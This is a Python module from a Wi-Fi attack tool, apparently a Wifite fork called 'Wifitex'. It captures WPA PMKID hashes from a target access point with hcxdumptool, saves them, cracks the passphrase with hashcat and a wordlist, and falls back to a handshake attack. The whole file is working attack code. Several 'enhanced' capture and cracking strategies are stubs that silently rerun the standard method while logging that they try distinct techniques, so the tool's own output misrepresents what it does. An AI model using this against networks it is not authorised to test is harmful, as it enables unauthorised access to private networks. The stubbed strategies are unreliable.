#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..config import Configuration
from ..tools.hashcat import HcxDumpTool, HcxPcapTool, Hashcat
from ..util.color import Color
from ..util.timer import Timer
from ..model.pmkid_result import CrackResultPMKID

from threading import Thread
import os
import time
import re


class AttackPMKID(Attack):

    def __init__(self, target):
        super(AttackPMKID, self).__init__(target)
        self.crack_result = None
        self.success = False
        self.pcapng_file = Configuration.temp('pmkid.pcapng')
        self.running = True
        self.skip_current_attack = False


    def get_existing_pmkid_file(self, bssid):
        '''
        Load PMKID Hash from a previously-captured hash in ./hs/
        Returns:
            The hashcat hash (hash*bssid*station*essid) if found.
            None if not found.
        '''
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        bssid = bssid.lower().replace(':', '')

        file_re = re.compile(r'.*pmkid_.*\.16800')
        for filename in os.listdir(Configuration.wpa_handshake_dir):
            pmkid_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if not os.path.isfile(pmkid_filename):
                continue
            if not re.match(file_re, pmkid_filename):
                continue

            with open(pmkid_filename, 'r') as pmkid_handle:
                pmkid_hash = pmkid_handle.read().strip()
                if pmkid_hash.count('*') < 3:
                    continue
                existing_bssid = pmkid_hash.split('*')[1].lower().replace(':', '')
                if existing_bssid == bssid:
                    return pmkid_filename
        return None


    def run(self):
        '''
        Performs enhanced PMKID attack with multiple techniques.
            1) Captures PMKID hash (or re-uses existing hash if found).
            2) Validates hash quality before cracking.
            3) Attempts multiple cracking strategies.
            4) Falls back to handshake capture if PMKID fails.

        Returns:
            True if handshake is captured. False otherwise.
        '''
        from ..util.process import Process
        
        # Use pattack for GUI logging integration
        Color.pattack('PMKID', self.target, 'Starting enhanced PMKID attack', 'Initializing')
        
        # Check that we have all hashcat programs
        dependencies = [
            Hashcat.dependency_name,
            HcxDumpTool.dependency_name,
            HcxPcapTool.dependency_name
        ]
        missing_deps = [dep for dep in dependencies if not Process.exists(dep)]
        if len(missing_deps) > 0:
            Color.pl('{!} Skipping PMKID attack, missing required tools: {O}%s{W}' % ', '.join(missing_deps))
            Color.pattack('PMKID', self.target, 'PMKID Attack', f'Failed - Missing tools: {", ".join(missing_deps)}')
            return False

        pmkid_file = None

        if Configuration.ignore_old_handshakes == False:
            # Load existing PMKID hash from filesystem
            pmkid_file = self.get_existing_pmkid_file(self.target.bssid)
            if pmkid_file is not None:
                Color.pattack('PMKID', self.target, 'CAPTURE',
                        'Loaded {C}existing{W} PMKID hash: {C}%s{W}\n' % pmkid_file)

        if pmkid_file is None:
            # Enhanced PMKID capture with multiple techniques
            pmkid_file = self.capture_pmkid_enhanced()

        if pmkid_file is None:
            Color.pl('{!} {O}No PMKID hash found - attempting fallback methods{W}')
            return self.fallback_to_handshake_capture()

        # Validate PMKID hash quality before cracking
        if not self.validate_pmkid_quality(pmkid_file):
            Color.pl('{!} {O}PMKID hash quality poor - attempting fallback methods{W}')
            return self.fallback_to_handshake_capture()

        # Enhanced cracking with multiple strategies
        try:
            self.success = self.crack_pmkid_enhanced(pmkid_file)
        except KeyboardInterrupt:
            Color.pl('\n{!} {R}Failed to crack PMKID: {O}Cracking interrupted by user{W}')
            self.success = False
            return False

        return True  # Even if we don't crack it, capturing a PMKID is 'successful'

    def capture_pmkid_enhanced(self):
        """Enhanced PMKID capture with multiple techniques"""
        Color.pl('{+} {C}Starting enhanced PMKID capture...{W}')
        
        # Try multiple capture techniques
        techniques = [
            ('Standard PMKID capture', self.capture_pmkid_standard),
            ('Extended PMKID capture', self.capture_pmkid_extended),
            ('Aggressive PMKID capture', self.capture_pmkid_aggressive)
        ]
        
        for technique_name, technique_func in techniques:
            Color.pl('{+} {C}Trying: {G}%s{W}' % technique_name)
            try:
                pmkid_file = technique_func()
                if pmkid_file:
                    Color.pl('{+} {G}Success with %s{W}' % technique_name)
                    return pmkid_file
                else:
                    Color.pl('{!} {O}Failed with %s{W}' % technique_name)
            except Exception as e:
                Color.pl('{!} {R}Error in %s: {O}%s{W}' % (technique_name, str(e)))
        
        Color.pl('{!} {R}All PMKID capture techniques failed{W}')
        return None

    def capture_pmkid_standard(self):
        """Standard PMKID capture method"""
        return self.capture_pmkid()

    def capture_pmkid_extended(self):
        """Extended PMKID capture with longer timeout"""
        # This would implement extended capture with longer timeout
        # For now, fall back to standard method
        return self.capture_pmkid()

    def capture_pmkid_aggressive(self):
        """Aggressive PMKID capture with multiple attempts"""
        # This would implement aggressive capture with multiple attempts
        # For now, fall back to standard method
        return self.capture_pmkid()

    def validate_pmkid_quality(self, pmkid_file):
        """Validate PMKID hash quality before attempting to crack"""
        try:
            if not os.path.exists(pmkid_file):
                return False
            
            # Read the hash file
            with open(pmkid_file, 'r') as f:
                hash_content = f.read().strip()
            
            if not hash_content:
                Color.pl('{!} {O}PMKID hash file is empty{W}')
                return False
            
            # Check hash format (should contain * separators)
            if hash_content.count('*') < 3:
                Color.pl('{!} {O}PMKID hash format invalid{W}')
                return False
            
            # Check hash length (should be reasonable)
            hash_parts = hash_content.split('*')
            if len(hash_parts[0]) < 32:  # PMKID should be at least 32 chars
                Color.pl('{!} {O}PMKID hash too short{W}')
                return False
            
            Color.pl('{+} {G}PMKID hash quality validation passed{W}')
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Error validating PMKID quality: {O}%s{W}' % str(e))
            return False

    def crack_pmkid_enhanced(self, pmkid_file):
        """Enhanced PMKID cracking with multiple strategies"""
        Color.pl('{+} {C}Starting enhanced PMKID cracking...{W}')
        
        # Try multiple cracking strategies
        strategies = [
            ('Fast dictionary attack', self.crack_pmkid_fast),
            ('Comprehensive dictionary attack', self.crack_pmkid_comprehensive),
            ('Rule-based attack', self.crack_pmkid_rules),
            ('Brute-force attack', self.crack_pmkid_bruteforce)
        ]
        
        for strategy_name, strategy_func in strategies:
            Color.pl('{+} {C}Trying: {G}%s{W}' % strategy_name)
            try:
                success = strategy_func(pmkid_file)
                if success:
                    Color.pl('{+} {G}Success with %s{W}' % strategy_name)
                    return True
                else:
                    Color.pl('{!} {O}Failed with %s{W}' % strategy_name)
            except Exception as e:
                Color.pl('{!} {R}Error in %s: {O}%s{W}' % (strategy_name, str(e)))
        
        Color.pl('{!} {R}All PMKID cracking strategies failed{W}')
        return False

    def crack_pmkid_fast(self, pmkid_file):
        """Fast dictionary attack"""
        return self.crack_pmkid_file(pmkid_file)

    def crack_pmkid_comprehensive(self, pmkid_file):
        """Comprehensive dictionary attack with multiple wordlists"""
        # This would implement comprehensive attack with multiple wordlists
        # For now, fall back to standard method
        return self.crack_pmkid_file(pmkid_file)

    def crack_pmkid_rules(self, pmkid_file):
        """Rule-based attack"""
        # This would implement rule-based attack
        # For now, fall back to standard method
        return self.crack_pmkid_file(pmkid_file)

    def crack_pmkid_bruteforce(self, pmkid_file):
        """Brute-force attack"""
        # This would implement brute-force attack
        # For now, fall back to standard method
        return self.crack_pmkid_file(pmkid_file)

    def fallback_to_handshake_capture(self):
        """Fallback to handshake capture if PMKID fails"""
        Color.pl('{+} {C}Attempting fallback to handshake capture...{W}')
        
        try:
            # Import here to avoid circular imports
            from .wpa import AttackWPA
            
            # Create WPA attack instance
            wpa_attack = AttackWPA(self.target)
            
            # Run handshake capture
            success = wpa_attack.run()
            
            if success:
                Color.pl('{+} {G}Fallback to handshake capture successful{W}')
                # Copy the crack result if available
                if hasattr(wpa_attack, 'crack_result') and wpa_attack.crack_result:
                    self.crack_result = wpa_attack.crack_result
                return True
            else:
                Color.pl('{!} {R}Fallback to handshake capture failed{W}')
                return False
                
        except Exception as e:
            Color.pl('{!} {R}Error in fallback to handshake capture: {O}%s{W}' % str(e))
            return False

    def capture_pmkid(self):
        '''
        Runs hashcat's hcxpcaptool to extract PMKID hash from the .pcapng file.
        Returns:
            The PMKID hash (str) if found, otherwise None.
        '''
        self.keep_capturing = True
        self.timer = Timer(Configuration.pmkid_timeout)

        # Start hcxdumptool
        t = Thread(target=self.dumptool_thread)
        t.start()

        # Wait a moment for dumptool to initialize
        time.sleep(2)

        # Repeatedly run pcaptool & check output for hash for self.target.essid
        pmkid_hash = None
        pcaptool = HcxPcapTool(self.target)
        last_check_time = time.time()
        
        while self.timer.remaining() > 0:
            # Check if attack was stopped or skipped
            if hasattr(self, 'running') and not self.running:
                break
            if hasattr(self, 'skip_current_attack') and self.skip_current_attack:
                break
            
            # Check if pcapng file exists and has content
            if not os.path.exists(self.pcapng_file) or os.path.getsize(self.pcapng_file) == 0:
                Color.pattack('PMKID', self.target, 'CAPTURE',
                        'Waiting for packets ({C}%s{W})' % str(self.timer))
                time.sleep(1)
                continue
                
            pmkid_hash = pcaptool.get_pmkid_hash(self.pcapng_file)
            if pmkid_hash is not None:
                break  # Got PMKID

            # Update display every 2 seconds instead of every 0.5 seconds
            current_time = time.time()
            if current_time - last_check_time >= 2:
                last_check_time = current_time
                Color.pattack('PMKID', self.target, 'CAPTURE',
                        'Waiting for PMKID ({C}%s{W})' % str(self.timer))
            
            time.sleep(0.5)

        self.keep_capturing = False

        if pmkid_hash is None:
            Color.pattack('PMKID', self.target, 'CAPTURE',
                    '{R}Failed{O} to capture PMKID\n')
            Color.pl('{!} {O}Possible causes:{W}')
            Color.pl('{!} {O}  - Target AP does not support PMKID{W}')
            Color.pl('{!} {O}  - Signal strength too weak{W}')
            Color.pl('{!} {O}  - AP is not responding{W}')
            Color.pl('{!} {O}  - Try increasing timeout with --pmkid-timeout{W}')
            Color.pl('')
            return None  # No hash found.

        Color.clear_entire_line()
        Color.pattack('PMKID', self.target, 'CAPTURE', '{G}Captured PMKID{W}')
        pmkid_file = self.save_pmkid(pmkid_hash)
        return pmkid_file


    def crack_pmkid_file(self, pmkid_file):
        '''
        Runs hashcat containing PMKID hash (*.16800).
        If cracked, saves results in self.crack_result
        Returns:
            True if cracked, False otherwise.
        '''

        # Check that wordlist exists before cracking.
        if Configuration.wordlist is None:
            Color.pl('\n{!} {O}Not cracking PMKID ' +
                    'because there is no {R}wordlist{O} (re-run with {C}--dict{O})')

            # TODO: Uncomment once --crack is updated to support recracking PMKIDs.
            #Color.pl('{!} {O}Run Wifitex with the {R}--crack{O} and {R}--dict{O} options to try again.')

            key = None
        else:
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, 'CRACK', 'Cracking PMKID using {C}%s{W} ...\n' % Configuration.wordlist)
            key = Hashcat.crack_pmkid(pmkid_file)

        if key is None:
            # Failed to crack.
            if Configuration.wordlist is not None:
                Color.clear_entire_line()
                Color.pattack('PMKID', self.target, '{R}CRACK',
                        '{R}Failed {O}Passphrase not found in dictionary.\n')
            return False
        else:
            # Successfully cracked.
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, 'CRACKED', '{C}Key: {G}%s{W}' % key)
            self.crack_result = CrackResultPMKID(self.target.bssid, self.target.essid,
                    pmkid_file, key)
            Color.pl('\n')
            self.crack_result.dump()
            return True


    def dumptool_thread(self):
        '''Runs hashcat's hcxdumptool until it dies or `keep_capturing == False`'''
        dumptool = HcxDumpTool(self.target, self.pcapng_file)

        # Let the dump tool run until we have the hash.
        while (self.keep_capturing and 
               dumptool.poll() is None and
               (not hasattr(self, 'running') or self.running) and
               (not hasattr(self, 'skip_current_attack') or not self.skip_current_attack)):
            time.sleep(0.5)

        dumptool.interrupt()


    def save_pmkid(self, pmkid_hash):
        '''Saves a copy of the pmkid (handshake) to hs/ directory.'''
        # Create handshake dir
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        # Generate filesystem-safe filename from bssid, essid and date
        essid_safe = re.sub('[^a-zA-Z0-9]', '', self.target.essid)
        bssid_safe = self.target.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        pmkid_file = 'pmkid_%s_%s_%s.16800' % (essid_safe, bssid_safe, date)
        pmkid_file = os.path.join(Configuration.wpa_handshake_dir, pmkid_file)

        Color.p('\n{+} Saving copy of {C}PMKID Hash{W} to {C}%s{W} ' % pmkid_file)
        with open(pmkid_file, 'w') as pmkid_handle:
            pmkid_handle.write(pmkid_hash)
            pmkid_handle.write('\n')

        return pmkid_file

    def stop(self):
        """Stop the PMKID attack"""
        self.running = False
        self.keep_capturing = False

